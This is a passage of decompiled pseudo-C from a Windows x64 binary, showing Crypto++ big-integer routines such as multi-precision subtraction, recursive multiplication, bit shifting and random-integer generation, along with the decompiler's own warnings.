    v21 = 0x1FFFFFFFFFFFFFFFi64;
    v22 = v13 + 2 * (v14 + 2) + v14 + 2;
    v19 = (_QWORD *)sub_13F123740((__int64)pExceptionObject, v22);
    v23 = v19;
    result = sub_13F11CB10(
               *(__m128i **)(a1 + 32),
               *(_QWORD *)(a2 + 32),
               v19,
               *(const __m128i **)(a3 + 32),
               v13,
               *(const __m128i **)(a4 + 32),
               v14);
    if ( v19 )
    {
      memset(v19, 0, 8i64 * (v13 + 2 * (v14 + 2) + v14 + 2));
      return (__m128i *)sub_13F12E4D0((__int64)v19);
    }
  }
  else
  {
    sub_13F113500(a1, a3);
    *(_DWORD *)(a1 + 40) = 0;
    return (__m128i *)sub_13F113500(a2, (__int64)&off_13F1C4398);
  }
  return result;
}
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();
// 13F1211E0: using guessed type char pExceptionObject[8];

//----- (000000013F1213E0) ----------------------------------------------------
__int64 __fastcall sub_13F1213E0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v5; // r11
  _QWORD *v8; // rax
  __int64 v9; // rsi
  __int64 v10; // r10
  __int64 v11; // rbx
  _QWORD *v12; // rax
  __int64 v13; // rsi
  BOOL v14; // eax
  __int64 v15; // rdx
  unsigned int v16; // ebx
  __int64 v17; // rsi
  const __m128i *v18; // r8
  _BOOL8 v19; // r15
  unsigned __int64 v20; // rcx
  __int64 result; // rax
  unsigned int v22; // edi
  __int64 *v23; // rdx
  __int64 v24; // rcx
  int v25; // edi
  __int64 v26; // rcx
  unsigned __int64 *v27; // rax
  unsigned __int64 v28; // rdx
  __int64 v29; // r15
  __int64 v30; // rsi
  const __m128i *v31; // r8
  __int64 v32; // rax
  __m128i *v33; // rcx

  v3 = *(_QWORD *)(a2 + 24);
  v5 = *(_QWORD *)(a2 + 32);
  if ( v3 )
  {
    v8 = (_QWORD *)(v5 + 8 * (v3 - 1));
    do
    {
      if ( *v8 )
        break;
      --v8;
      --v3;
    }
    while ( v3 );
  }
  v9 = *(_QWORD *)(a3 + 24);
  v10 = *(_QWORD *)(a3 + 32);
  v11 = (unsigned int)(v3 & 1) + (unsigned int)v3;
  if ( v9 )
  {
    v12 = (_QWORD *)(v10 + 8 * (v9 - 1));
    do
    {
      if ( *v12 )
        break;
      --v12;
      --v9;
    }
    while ( v9 );
  }
  v13 = (unsigned int)(v9 & 1) + (unsigned int)v9;
  if ( (unsigned int)v11 <= (unsigned int)v13 )
  {
    if ( (_DWORD)v11 == (_DWORD)v13 )
    {
      v26 = (unsigned int)v11;
      if ( (_DWORD)v11 )
      {
        v27 = (unsigned __int64 *)(v10 + 8 * v11);
        do
        {
          v28 = *(unsigned __int64 *)((char *)v27-- + v5 - v10 - 8);
          --v26;
          if ( v28 > *v27 )
            break;
          if ( v28 < *v27 )
          {
            v25 = 1;
            result = sub_13F13A520((unsigned int)v11, *(_QWORD *)(a1 + 32), *(_QWORD *)(a3 + 32), v5);
            goto LABEL_29;
          }
        }
        while ( v26 );
      }
      v25 = 0;
      result = sub_13F13A520((unsigned int)v11, *(_QWORD *)(a1 + 32), v5, v10);
    }
    else
    {
      v29 = sub_13F13A520((unsigned int)v11, *(_QWORD *)(a1 + 32), *(_QWORD *)(a3 + 32), v5);
      v30 = (unsigned int)(v13 - v11);
      v31 = (const __m128i *)(*(_QWORD *)(a3 + 32) + 8i64 * (unsigned int)v11);
      v32 = *(_QWORD *)(a1 + 32);
      v33 = (__m128i *)(v32 + 8i64 * (unsigned int)v11);
      if ( v33 != v31 )
      {
        sub_13F10D330(v33, 8 * v30, v31, 8 * v30);
        v32 = *(_QWORD *)(a1 + 32);
      }
      result = sub_13F11CA30((unsigned __int64 *)(v32 + 8i64 * (unsigned int)v11), (unsigned int)v30, v29);
      v25 = 1;
    }
  }
  else
  {
    v14 = sub_13F13A520((unsigned int)v13, *(_QWORD *)(a1 + 32), v5, *(_QWORD *)(a3 + 32));
    v15 = *(_QWORD *)(a1 + 32);
    v16 = v11 - v13;
    v17 = 8 * v13;
    v18 = (const __m128i *)(v17 + *(_QWORD *)(a2 + 32));
    v19 = v14;
    if ( (const __m128i *)(v17 + v15) != v18 )
    {
      sub_13F10D330((__m128i *)(v17 + v15), 8i64 * v16, v18, 8i64 * v16);
      v15 = *(_QWORD *)(a1 + 32);
    }
    v20 = *(_QWORD *)(v17 + v15);
    result = v20 - v19;
    *(_QWORD *)(v17 + v15) = v20 - v19;
    if ( v20 - v19 > v20 )
    {
      v22 = 1;
      if ( v16 > 1 )
      {
        v23 = (__int64 *)(v17 + v15 + 8);
        do
        {
          v24 = *v23;
          result = *v23 - 1;
          *v23 = result;
          if ( v24 )
            break;
          ++v22;
          ++v23;
        }
        while ( v22 < v16 );
      }
    }
    v25 = 0;
  }
LABEL_29:
  *(_DWORD *)(a1 + 40) = v25;
  return result;
}

//----- (000000013F1215D0) ----------------------------------------------------
__int64 __fastcall sub_13F1215D0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v4; // rbx
  __int64 v5; // rax
  _QWORD *v6; // rdx

  v4 = (a2 + 64) >> 6;
  sub_13F112960(a1, 0i64, v4);
  v5 = sub_13F122180(v4);
  sub_13F11C2E0((_QWORD *)(a1 + 8), v5);
  v6 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (a2 >> 6));
  *v6 |= 1i64 << (a2 & 0x3F);
  return a1;
}

//----- (000000013F121660) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F121660(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v8; // ebp
  int v9; // eax
  unsigned __int64 v10; // rcx
  __int64 v11; // rdi
  _QWORD *v12; // rax
  __int64 v13; // r8
  __int64 v14; // rdx
  unsigned __int64 v15; // r15
  __int64 v16; // rax
  void *v17; // rbx
  _QWORD *v18; // rcx
  __int64 v19; // rdi
  unsigned __int64 v20; // r8
  unsigned int v21; // edx
  unsigned int v22; // ecx
  unsigned __int64 v23; // rdi
  __int64 result; // rax
  __m128i v25; // [rsp+30h] [rbp-B8h] BYREF
  unsigned __int64 v26; // [rsp+40h] [rbp-A8h]
  __int64 v27; // [rsp+48h] [rbp-A0h]
  _QWORD *v28; // [rsp+50h] [rbp-98h]
  int v29; // [rsp+58h] [rbp-90h]
  char pExceptionObject[64]; // [rsp+60h] [rbp-88h] BYREF

  v8 = 0;
  if ( *(_DWORD *)(a3 + 40) == 1 )
  {
    if ( *(_DWORD *)(a4 + 40) != 1 )
      goto LABEL_7;
    v9 = -(int)sub_13F121140(a3, a4);
  }
  else
  {
    if ( *(_DWORD *)(a4 + 40) == 1 )
      goto LABEL_39;
    v9 = sub_13F121140(a3, a4);
  }
  if ( v9 > 0 )
  {
LABEL_39:
    sub_13F1053B0(&v25, (const __m128i *)"Integer: Min must be no greater than Max");
    sub_13F101600((__int64)pExceptionObject, &v25);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
LABEL_7:
  v10 = *(_QWORD *)(a4 + 24);
  if ( v10 < *(_QWORD *)(a3 + 24) )
    v10 = *(_QWORD *)(a3 + 24);
  v25.m128i_i64[0] = (__int64)off_13F185278;
  v11 = sub_13F122180(v10);
  v26 = 0x1FFFFFFFFFFFFFFFi64;
  v27 = v11;
  v12 = (_QWORD *)sub_13F123740((__int64)&v25.m128i_i64[1], v11);
  v28 = v12;
  v29 = 0;
  *v12 = 0i64;
  if ( v11 != 1 )
    memset(v12 + 1, 0, 8 * (v11 - 1));
  if ( *(_DWORD *)(a4 + 40) == 1 )
  {
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0((__int64)&v25, a4, a3);
      v29 = 1;
      goto LABEL_18;
    }
    v13 = a4;
    v14 = a3;
  }
  else
  {
    v13 = a3;
    v14 = a4;
    if ( *(_DWORD *)(a3 + 40) == 1 )
    {
      sub_13F120FA0((__int64)&v25, a4, a3);
      goto LABEL_18;
    }
  }
  sub_13F1213E0((__int64)&v25, v14, v13);
LABEL_18:
  v15 = v27;
  v16 = v27;
  v17 = v28;
  if ( v27 )
  {
    v18 = &v28[v27 - 1];
    do
    {
      if ( *v18 )
        break;
      --v18;
      --v16;
    }
    while ( v16 );
  }
  if ( (_DWORD)v16 )
  {
    v19 = (unsigned int)(v16 - 1);
    v20 = v28[v19];
    if ( v20 )
    {
      v21 = 64;
      do
      {
        v22 = (v21 + v8) >> 1;
        if ( !(v20 >> v22) )
          v21 = (v21 + v8) >> 1;
        if ( !(v20 >> v22) )
          v22 = v8;
        v8 = v22;
      }
      while ( v21 - v22 > 1 );
      v8 = v21;
    }
    v23 = v8 + ((_DWORD)v19 << 6);
  }
  else
  {
    v23 = 0i64;
  }
  do
    sub_13F1218D0(a1, a2, v23);
  while ( sub_13F113DA0(a1, (__int64)&v25) );
  result = sub_13F113F60(a1, a3);
  if ( v26 < v15 )
    v15 = v26;
  if ( v17 )
  {
    memset(v17, 0, 8 * v15);
    return sub_13F12E4D0((__int64)v17);
  }
  return result;
}
// 13F1216F5: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F1218D0) ----------------------------------------------------
__int64 __fastcall sub_13F1218D0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  char v3; // si
  __int64 v6; // r15
  _BYTE *v8; // [rsp+40h] [rbp-88h]
  char v9[64]; // [rsp+50h] [rbp-78h] BYREF

  v3 = a3;
  v6 = (a3 >> 3) + 1;
  v8 = (_BYTE *)sub_13F12E4E0(v6);
  (*(void (__fastcall **)(__int64, _BYTE *, __int64))(*(_QWORD *)a2 + 72i64))(a2, v8, v6);
  *v8 &= (1 << (v3 & 7)) - 1;
  sub_13F1131B0((__int64)v9, (__int64)v8, v6);
  sub_13F11C820(a1, (__int64)v9, v6, 0);
  memset(v8, 0, v6);
  return sub_13F12E550(v8);
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F1219C0) ----------------------------------------------------
__int64 __fastcall sub_13F1219C0(unsigned __int64 *a1, __m128i *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v7; // rbp
  unsigned __int64 v9; // r8
  unsigned int v10; // edi
  __int64 v11; // rdx
  unsigned __int64 v12; // rcx
  unsigned int v13; // edi
  unsigned int v14; // er8
  __int64 *v15; // rdx
  unsigned __int64 v17; // rcx
  __int64 *v18; // rax

  if ( a4 == 2 )
  {
    v9 = *a3;
    v10 = 3;
    v11 = v9 & 7;
    do
    {
      v10 *= 2;
      v11 *= 2 - v9 * v11;
    }
    while ( v10 < 0x40 );
    a2->m128i_i64[0] = v11;
    a2->m128i_i64[1] = 0i64;
    funcs_13F121EFC(&a2[1], a2, a3);
    v12 = a2[1].m128i_u64[0];
    v13 = 1;
    a2[1].m128i_i64[0] = v12 - 1;
    if ( v12 - 1 > v12 )
    {
      v14 = 1;
      v15 = &a2[1].m128i_i64[1];
      do
      {
        if ( (*v15)-- )
          break;
        ++v14;
        ++v15;
      }
      while ( v14 < 2 );
    }
    a2[1] = _mm_andnot_si128(_mm_loadu_si128(a2 + 1), (__m128i)xmmword_13F185AF0);
    v17 = a2[1].m128i_u64[0];
    a2[1].m128i_i64[0] = v17 + 2;
    if ( v17 + 2 < v17 )
    {
      v18 = &a2[1].m128i_i64[1];
      do
      {
        if ( (*v18)++ != -1 )
          break;
        ++v13;
        ++v18;
      }
      while ( v13 < 2 );
    }
    return funcs_13F121EFC(a1, a2, &a2[1]);
  }
  else
  {
    v7 = a4 >> 1;
    sub_13F1219C0(a1, a2, a3, a4 >> 1);
    a2->m128i_i64[0] = 1i64;
    if ( v7 != 1 )
      memset(&a2->m128i_u64[1], 0, 8 * (v7 - 1));
    sub_13F120AC0(&a1[v7], &a2->m128i_i64[v7], (__int64)a2, a1, a3, v7);
    sub_13F121EC0(a2, &a2->m128i_i64[v7], a1, &a3[v7], v7);
    sub_13F13A4D0(v7, (__int64)a2, (__int64)&a1[v7], (__int64)a2);
    sub_13F123550((unsigned __int64 *)a2, v7);
    return sub_13F121EC0(&a1[v7], &a2->m128i_i64[v7], a1, (unsigned __int64 *)a2, v7);
  }
}
// 13F185AF0: using guessed type __int128 xmmword_13F185AF0;
// 13F1C4480: using guessed type __int64 (__fastcall *funcs_13F121EFC)(_QWORD, _QWORD, _QWORD);

//----- (000000013F121B80) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F121B80(
        _QWORD *a1,
        _QWORD *a2,
        unsigned __int64 *a3,
        unsigned __int64 *a4,
        unsigned __int64 a5)
{
  unsigned __int64 result; // rax
  int v10; // edi
  int v11; // er12
  unsigned __int64 v12; // r14
  unsigned int v13; // ebx
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // rsi
  unsigned __int64 *v16; // rax
  unsigned __int64 v17; // rdx
  int v18; // eax
  unsigned __int64 v19; // rcx
  unsigned __int64 v20; // rcx
  unsigned __int64 *v21; // rax
  unsigned __int64 v22; // rdx
  unsigned __int64 v23; // rsi
  __int64 v24; // rdi
  unsigned __int64 *v25; // r15
  BOOL v26; // er13
  unsigned __int64 *v27; // rdi
  BOOL v28; // er13
  unsigned __int64 v29; // rax
  BOOL v30; // er13
  unsigned __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  unsigned int v33; // ecx
  __int64 v34; // rax
  bool v35; // zf
  unsigned __int64 v36; // rdx
  unsigned __int64 *v37; // [rsp+30h] [rbp-48h]
  unsigned __int64 v38; // [rsp+38h] [rbp-40h]
  unsigned __int64 v42; // [rsp+A0h] [rbp+28h]
  BOOL v43; // [rsp+A0h] [rbp+28h]

  if ( a5 <= 0x10 )
    return ((unsigned __int64 (__fastcall *)(_QWORD *, unsigned __int64 *, unsigned __int64 *))funcs_13F121BCD[a5 >> 2])(
             a1,
             a3,
             a4);
  v10 = -1;
  v11 = 0;
  v12 = a5 >> 1;
  v13 = 1;
  v14 = a5 >> 1;
  v15 = a5 >> 1;
  v42 = v15 * 8;
  if ( a5 >> 1 )
  {
    v16 = &a3[v15];
    while ( 1 )
    {
      v17 = *--v16;
      --v14;
      if ( v17 > v16[v15] )
        break;
      if ( v17 < v16[v15] )
      {
        v18 = -1;
        goto LABEL_9;
      }
      if ( !v14 )
        goto LABEL_8;
    }
    v18 = 1;
  }
  else
  {
LABEL_8:
    v18 = 0;
  }
LABEL_9:
  v19 = a5 >> 1;
  if ( v18 > 0 )
    v19 = 0i64;
  v38 = v19;
  sub_13F13A520(a5 >> 1, (__int64)a1, (__int64)&a3[v19], (__int64)&a3[v12 ^ v19]);
  v20 = a5 >> 1;
  v37 = &a4[v15];
  if ( v12 )
  {
    v21 = &a4[v15];
    while ( 1 )
    {
      v22 = *--v21;
      --v20;
      if ( v22 > v21[v15] )
        break;
      if ( v22 < v21[v15] )
        goto LABEL_17;
      if ( !v20 )
        goto LABEL_16;
    }
    v10 = 1;
  }
  else
  {
LABEL_16:
    v10 = 0;
  }
LABEL_17:
  v23 = a5 >> 1;
  if ( v10 > 0 )
    v23 = 0i64;
  sub_13F13A520(a5 >> 1, (__int64)a1 + v42, (__int64)&a4[v23], (__int64)&a4[v12 ^ v23]);
  v24 = (__int64)&a2[a5];
  v25 = &a1[a5];
  sub_13F121B80(v25, v24, &a3[v12], v37, a5 >> 1);
  sub_13F121B80(a2, v24, a1, &a1[v12], a5 >> 1);
  sub_13F121B80(a1, v24, a3, a4, a5 >> 1);
  v26 = sub_13F13A4D0(a5 >> 1, (__int64)v25, (__int64)v25, (__int64)&a1[v12]);
  v43 = sub_13F13A4D0(a5 >> 1, (__int64)&a1[v12], (__int64)v25, (__int64)a1) + v26;
  v27 = &a1[v12 + a5];
  v28 = sub_13F13A4D0(a5 >> 1, (__int64)v25, (__int64)v25, (__int64)v27) + v26;
  v29 = v12;
  if ( v38 == v23 )
    v30 = v28 - sub_13F13A520(a5, (__int64)&a1[v29], (__int64)&a1[v29], (__int64)a2);
  else
    v30 = sub_13F13A4D0(a5, (__int64)&a1[v29], (__int64)&a1[v29], (__int64)a2) + v28;
  v31 = *v25;
  v32 = *v25 + v43;
  *v25 = v32;
  if ( v32 < v31 )
  {
    v33 = 1;
    if ( v12 <= 1 )
    {
LABEL_30:
      v11 = 1;
    }
    else
    {
      v34 = 1i64;
      while ( 1 )
      {
        v35 = v25[v34]++ == -1i64;
        if ( !v35 )
          break;
        v34 = ++v33;
        if ( v33 >= v12 )
          goto LABEL_30;
      }
    }
  }
  v36 = *v27;
  result = *v27 + v11 + v30;
  *v27 = result;
  if ( result < v36 && v12 > 1 )
  {
    result = 1i64;
    do
    {
      v35 = v27[result]++ == -1i64;
      if ( !v35 )
        break;
      result = ++v13;
    }
    while ( v13 < v12 );
  }
  return result;
}
// 13F1C4430: using guessed type __int64 (__fastcall *funcs_13F121BCD[3])();

//----- (000000013F121EC0) ----------------------------------------------------
__int64 __fastcall sub_13F121EC0(
        _QWORD *a1,
        _QWORD *a2,
        unsigned __int64 *a3,
        unsigned __int64 *a4,
        unsigned __int64 a5)
{
  unsigned __int64 v10; // rsi
  _QWORD *v11; // rbx

  if ( a5 <= 0x10 )
    return (*(&funcs_13F121EFC + (a5 >> 2)))(a1, a3, a4);
  v10 = a5 >> 1;
  sub_13F121B80(a1, a2, a3, a4, a5 >> 1);
  sub_13F121EC0(a2, (__int64)&a2[v10], &a3[v10], a4, v10);
  v11 = &a1[a5 >> 1];
  sub_13F13A4D0(a5 >> 1, (__int64)v11, (__int64)v11, (__int64)a2);
  sub_13F121EC0(a2, (__int64)&a2[v10], a3, &a4[v10], v10);
  return sub_13F13A4D0(a5 >> 1, (__int64)v11, (__int64)v11, (__int64)a2);
}
// 13F1C4480: using guessed type __int64 (__fastcall *funcs_13F121EFC)(_QWORD, _QWORD, _QWORD);

//----- (000000013F121F90) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F121F90(_QWORD *a1, _QWORD *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 result; // rax
  _QWORD *v9; // rdi
  unsigned __int64 v10; // rsi
  unsigned __int64 v11; // rdx
  unsigned __int64 *v12; // r8
  unsigned __int64 v13; // rcx
  __int64 v14; // rcx

  if ( a4 <= 0x10 )
    return ((unsigned __int64 (__fastcall *)(_QWORD *, unsigned __int64 *))funcs_13F121FD2[a4 >> 2])(a1, a3);
  v9 = &a2[a4];
  v10 = a4 >> 1;
  sub_13F121F90(a1, v9, a3, a4 >> 1);
  sub_13F121F90(&a1[a4], v9, &a3[v10], a4 >> 1);
  sub_13F121B80(a2, v9, a3, &a3[v10], a4 >> 1);
  LODWORD(v9) = sub_13F13A4D0(a4, (__int64)&a1[v10], (__int64)&a1[v10], (__int64)a2);
  result = sub_13F13A4D0(a4, (__int64)&a1[v10], (__int64)&a1[v10], (__int64)a2);
  v11 = a1[v10 + a4];
  v12 = &a1[v10 + a4];
  v13 = v11 + (int)result + (int)v9;
  *v12 = v13;
  if ( v13 < v11 )
  {
    result = 1i64;
    if ( v10 > 1 )
    {
      v14 = 1i64;
      do
      {
        if ( v12[v14]++ != -1i64 )
          break;
        result = (unsigned int)(result + 1);
        v14 = (unsigned int)result;
      }
      while ( (unsigned int)result < v10 );
    }
  }
  return result;
}
// 13F1C44D0: using guessed type __int64 (__fastcall *funcs_13F121FD2[3])();

//----- (000000013F1220B0) ----------------------------------------------------
__int64 __fastcall sub_13F1220B0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_13F113FF0(a2, a3);
}

//----- (000000013F1220C0) ----------------------------------------------------
__int64 __fastcall sub_13F1220C0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rcx
  __int64 v6; // rax

  v5 = *(_QWORD *)(a2 + 24);
  v6 = *(_QWORD *)(a1 + 48);
  if ( v5 == v6 && *(_QWORD *)(a3 + 24) == v6 )
  {
    if ( sub_13F13A520(v5, *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a3 + 32)) )
    {
      sub_13F13A4D0(*(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a1 + 56));
      return a2;
    }
  }
  else
  {
    sub_13F113FF0(a2, a3);
    if ( *(_DWORD *)(a2 + 40) == 1 )
      sub_13F113F60(a2, a1 + 24);
  }
  return a2;
}

//----- (000000013F122150) ----------------------------------------------------
__int64 __fastcall sub_13F122150(__int64 a1, __int64 a2)
{
  __int64 v3; // rax

  v3 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 144i64))(*(_QWORD *)(a1 + 8));
  return sub_13F113500(a2, v3);
}

//----- (000000013F122180) ----------------------------------------------------
__int64 __fastcall sub_13F122180(unsigned __int64 a1)
{
  unsigned __int64 v2; // r10
  unsigned int v3; // er9
  int v4; // er8
  unsigned int v5; // edx
  unsigned int v6; // ecx

  if ( a1 <= 8 )
    return *((unsigned int *)qword_13F1857A8 + a1);
  if ( a1 <= 0x10 )
    return 16i64;
  if ( a1 <= 0x20 )
    return 32i64;
  if ( a1 <= 0x40 )
    return 64i64;
  v2 = a1 - 1;
  v3 = 0;
  v4 = 64;
  do
  {
    v5 = v4;
    v6 = (v4 + v3) >> 1;
    if ( !(v2 >> v6) )
      v5 = (v4 + v3) >> 1;
    if ( !(v2 >> v6) )
      v6 = v3;
    v3 = v6;
    v4 = v5;
  }
  while ( v5 - v6 > 1 );
  return 1i64 << v5;
}
// 13F1221BE: conditional instruction was optimized away because rcx.8>=41u
// 13F1857A8: using guessed type __int64 qword_13F1857A8[5];

//----- (000000013F122210) ----------------------------------------------------
__int64 __fastcall sub_13F122210(__int64 a1, __int64 a2)
{
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 152i64))(*(_QWORD *)(a1 + 8));
  return a2;
}

//----- (000000013F122230) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
unsigned __int64 (__fastcall *sub_13F122230())(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 (__fastcall *result)(_QWORD *, unsigned __int64 *, unsigned __int64 *, unsigned __int64); // rax

  funcs_13F121BCD[0] = (__int64 (__fastcall *)())sub_13F1171E0;
  funcs_13F121EFC = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_13F118A90;
  funcs_13F121FD2[0] = (__int64 (__fastcall *)())sub_13F11B8B0;
  funcs_13F120B11[0] = (__int64 (__fastcall *)())sub_13F119FD0;
  off_13F1C4528[0] = (__int64 (__fastcall *)())sub_13F11A060;
  off_13F1C4438[0] = (__int64 (__fastcall *)())sub_13F117260;
  off_13F1C4440 = (__int64 (__fastcall *)())sub_13F117490;
  off_13F1C4488[0] = (__int64 (__fastcall *)())sub_13F118AC0;
  off_13F1C4490 = (__int64 (__fastcall *)())sub_13F118BB0;
  off_13F1C44D8[0] = (__int64 (__fastcall *)())sub_13F11B920;
  off_13F1C44E0 = (__int64 (__fastcall *)())sub_13F11BAC0;
  off_13F1C4530 = (__int64 (__fastcall *)())sub_13F11A240;
  off_13F1C4450 = (__int64 (__fastcall *)())sub_13F1152D0;
  off_13F1C44A0 = (__int64 (__fastcall *)())sub_13F117C30;
  off_13F1C44F0 = (__int64 (__fastcall *)())sub_13F11A750;
  result = sub_13F118F80;
  off_13F1C4540 = (__int64 (__fastcall *)())sub_13F118F80;
  return result;
}
// 13F122237: write access to const memory at 13F1C4430 has been detected
// 13F122245: write access to const memory at 13F1C4480 has been detected
// 13F122253: write access to const memory at 13F1C44D0 has been detected
// 13F122261: write access to const memory at 13F1C4520 has been detected
// 13F12226F: write access to const memory at 13F1C4528 has been detected
// 13F12227D: write access to const memory at 13F1C4438 has been detected
// 13F12228B: write access to const memory at 13F1C4440 has been detected
// 13F122299: write access to const memory at 13F1C4488 has been detected
// 13F1222A7: write access to const memory at 13F1C4490 has been detected
// 13F1222B5: write access to const memory at 13F1C44D8 has been detected
// 13F1222C3: write access to const memory at 13F1C44E0 has been detected
// 13F1222D1: write access to const memory at 13F1C4530 has been detected
// 13F1222DF: write access to const memory at 13F1C4450 has been detected
// 13F1222ED: write access to const memory at 13F1C44A0 has been detected
// 13F1222FB: write access to const memory at 13F1C44F0 has been detected
// 13F122309: write access to const memory at 13F1C4540 has been detected
// 13F1C4430: using guessed type __int64 (__fastcall *funcs_13F121BCD[3])();
// 13F1C4438: using guessed type __int64 (__fastcall *off_13F1C4438[2])();
// 13F1C4440: using guessed type __int64 (__fastcall *off_13F1C4440)();
// 13F1C4450: using guessed type __int64 (__fastcall *off_13F1C4450)();
// 13F1C4480: using guessed type __int64 (__fastcall *funcs_13F121EFC)(_QWORD, _QWORD, _QWORD);
// 13F1C4488: using guessed type __int64 (__fastcall *off_13F1C4488[2])();
// 13F1C4490: using guessed type __int64 (__fastcall *off_13F1C4490)();
// 13F1C44A0: using guessed type __int64 (__fastcall *off_13F1C44A0)();
// 13F1C44D0: using guessed type __int64 (__fastcall *funcs_13F121FD2[3])();
// 13F1C44D8: using guessed type __int64 (__fastcall *off_13F1C44D8[2])();
// 13F1C44E0: using guessed type __int64 (__fastcall *off_13F1C44E0)();
// 13F1C44F0: using guessed type __int64 (__fastcall *off_13F1C44F0)();
// 13F1C4520: using guessed type __int64 (__fastcall *funcs_13F120B11[3])();
// 13F1C4528: using guessed type __int64 (__fastcall *off_13F1C4528[2])();
// 13F1C4530: using guessed type __int64 (__fastcall *off_13F1C4530)();
// 13F1C4540: using guessed type __int64 (__fastcall *off_13F1C4540)();

//----- (000000013F122320) ----------------------------------------------------
void __fastcall sub_13F122320(char *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  char *v3; // rax
  unsigned __int64 v4; // rdi

  if ( a2 < a3 )
    a3 = a2;
  if ( a3 )
  {
    if ( a2 - 1 >= a3 )
    {
      v3 = &a1[8 * a2 - 8];
      v4 = a2 - a3;
      do
      {
        *(_QWORD *)v3 = *(_QWORD *)&v3[-8 * a3];
        v3 -= 8;
        --v4;
      }
      while ( v4 );
    }
    memset(a1, 0, 8 * a3);
  }
}
// 13F122374: conditional instruction was optimized away because r8.8!=0

//----- (000000013F122390) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F122390(__int64 a1, __int64 a2, int a3)
{
  unsigned __int64 result; // rax
  char v4; // r11
  __int64 v5; // r9
  unsigned __int64 *v6; // r10
  char v7; // bl
  unsigned __int64 v8; // r8
  __int64 v9; // rdx

  result = 0i64;
  v4 = a3;
  v5 = a2;
  if ( a3 && a2 )
  {
    v6 = (unsigned __int64 *)(a1 - 8 + 8 * a2);
    v7 = 64 - a3;
    do
    {
      v8 = *v6--;
      v9 = result | (v8 >> v4);
      result = v8 << v7;
      v6[1] = v9;
      --v5;
    }
    while ( v5 );
  }
  return result;
}

//----- (000000013F1223F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F1223F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 v7; // r15
  __int64 v8; // rax
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 *v11; // r14
  __int64 v12; // r12
  __m128i *v13; // rbx
  __m128i *v14; // r13
  unsigned __int64 v15; // rsi
  __int64 v16; // rax
  __m128i *v17; // r8
  __int64 v18; // rax
  __int64 *v19; // rdx
  unsigned __int64 v20; // rbx
  __m128i *v21; // rax
  __m128i *v22; // rsi
  __int64 (__fastcall **v23)(); // [rsp+30h] [rbp-D0h] BYREF
  char v24[8]; // [rsp+38h] [rbp-C8h] BYREF
  unsigned __int64 v25; // [rsp+40h] [rbp-C0h]
  unsigned __int64 v26; // [rsp+48h] [rbp-B8h]
  __m128i *v27; // [rsp+50h] [rbp-B0h]
  int v28; // [rsp+58h] [rbp-A8h]
  __int64 v29; // [rsp+60h] [rbp-A0h]
  _QWORD v30[12]; // [rsp+70h] [rbp-90h] BYREF
  __int64 v31; // [rsp+D0h] [rbp-30h]
  __m128i *v32; // [rsp+D8h] [rbp-28h]
  int v33; // [rsp+E0h] [rbp-20h]
  unsigned __int64 *v34; // [rsp+138h] [rbp+38h]
  __m128i *v35; // [rsp+160h] [rbp+60h]

  v29 = -2i64;
  v7 = a2;
  if ( *(_QWORD *)(a1 + 48) && (**(_BYTE **)(a1 + 56) & 1) != 0 )
  {
    sub_13F112F30((__int64)v30, a1 + 24);
    v8 = sub_13F11C590((__int64)v30, (__int64)&v23, a3);
    sub_13F135410((__int64)v30, v7, v8, a4, a5);
    v9 = v26;
    if ( v25 < v26 )
      v9 = v25;
    v10 = (__int64)v27;
    if ( v27 )
    {
      memset(v27, 0, 8 * v9);
      sub_13F12E4D0(v10);
    }
    if ( a5 )
    {
      v11 = (__int64 *)(v7 + 24);
      v12 = a5;
      do
      {
        v13 = v35;
        v14 = v32;
        v15 = v30[6];
        v16 = *v11;
        v17 = (__m128i *)v11[1];
        if ( v35 != v17 )
        {
          sub_13F10D330(v35, 8 * v16, v17, 8 * v16);
          v16 = *v11;
        }
        if ( 2 * v15 != v16 )
          memset((char *)v13 + 8 * v16, 0, 8 * (2 * v15 - v16));
        sub_13F120000(v14, (unsigned __int64 *)&v13[v15], (unsigned __int64 *)v13, (unsigned __int64 *)v30[7], v34, v15);
        v23 = off_13F185278;
        v18 = v31;
        if ( v31 )
        {
          v19 = &v32->m128i_i64[v31 - 1];
          do
          {
            if ( *v19 )
              break;
            --v19;
            --v18;
          }
          while ( v18 );
        }
        v20 = sub_13F122180((unsigned int)v18);
        v25 = 0x1FFFFFFFFFFFFFFFi64;
        v26 = v20;
        v21 = (__m128i *)sub_13F123740((__int64)v24, v20);
